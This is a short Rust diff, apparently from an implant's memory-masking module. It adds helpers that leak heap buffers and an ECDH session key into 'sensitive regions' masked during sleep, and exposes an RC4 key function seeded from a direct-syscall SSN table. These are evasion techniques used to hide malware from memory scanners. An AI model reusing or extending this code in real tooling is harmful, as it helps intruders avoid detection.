@@ -71,11 +71,34 @@ pub unsafe fn register_region(region: &'static mut [u8]) -> bool {
     false
 }
 
+/// Register a heap-allocated buffer as a sensitive region. The buffer is
+/// **leaked** (never freed) to satisfy the `'static` requirement of
+/// [`register_region`]. The leaked slice is masked at sleep and never touched
+/// again — the bump allocator never reclaims it anyway.
+///
+/// Returns false if the region table is full (8 slots).
+pub fn register_owned(buf: Vec<u8>) -> bool {
+    let leaked: &'static mut [u8] = Vec::leak(buf);
+    unsafe { register_region(leaked) }
+}
+
+/// Register the 32-byte ECDH session key as a sensitive region. A copy is
+/// heap-allocated and leaked so the key sits in maskable memory for the
+/// process lifetime.
+///
+/// Returns false if the region table is full (8 slots).
+pub fn register_key(key: [u8; 32]) -> bool {
+    let mut buf = Vec::with_capacity(32);
+    buf.extend_from_slice(&key);
+    let leaked: &'static mut [u8] = Vec::leak(buf);
+    unsafe { register_region(leaked) }
+}
+
 /// Derive a per-run RC4 key from the syscall runtime's SSN table (a per-boot
 /// unpredictable value) so the keystream differs across runs without a CSPRNG.
 /// Expands the 32-bit seed into a 32-byte key (RC4 has no key-length ceiling).
 /// Falls back to a fixed marker key if the runtime isn't up yet.
-fn mask_key() -> [u8; 32] {
+pub(crate) fn mask_key() -> [u8; 32] {
     let seed = match crate::syscalls::global() {
         Some(rt) => {
             // Sum a few well-known SSNs. Cheap (cold path, once per mask cycle).
